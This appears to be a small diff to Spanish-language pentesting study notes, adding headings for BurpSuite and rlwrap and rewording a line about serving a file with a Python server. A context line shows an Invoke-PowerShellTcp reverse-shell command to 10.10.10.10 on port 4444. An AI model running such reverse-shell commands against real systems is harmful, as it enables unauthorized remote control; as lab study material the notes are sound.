@@ -68,8 +68,11 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444
 ![[Pasted image 20240311110955.png]]
 
 ### Servidor con python
-estaremos compartiendo este archivo en un servidor para que
+estaremos compartiendo este archivo en un servidor con python
 ![[Pasted image 20240311110845.png]]
+
+### BurpSuite
+
 
 ### rlwrap
 
